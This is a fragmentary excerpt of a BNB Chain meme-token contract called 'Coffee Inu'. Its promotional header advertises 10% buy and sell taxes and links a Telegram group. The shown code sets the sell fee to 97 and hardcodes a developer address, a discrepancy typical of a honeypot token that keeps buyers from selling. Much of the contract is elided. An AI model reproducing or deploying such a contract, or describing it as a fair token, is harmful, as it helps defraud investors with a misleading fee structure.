...
COFFEE INU
Meme coin with BNB rewards
Taxes 10/10, later 6/6.

telegram: https://t.me/Coffeeinu
...
/* Token contract */
contract Coffeeinu is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0xDED250F3a8F231d61bb8CE97C304c8eB9F280446;
    ...
    // Name and symbol
    string constant _name = "Coffee Inu";
    ...
    // Max wallet and TX
    uint256 public _maxBuyTxAmount = _totalSupply * 500 / 10000; // 5% (5 mil)
    uint256 public _maxSellTxAmount = _totalSupply * 250 / 10000; // 2.5% (2.5 mil)
    uint256 public _maxWalletToken = ( _totalSupply * 500 ) / 10000; // 5% (5 mil)
    ...
    uint256 public totalFeeSell = 97;
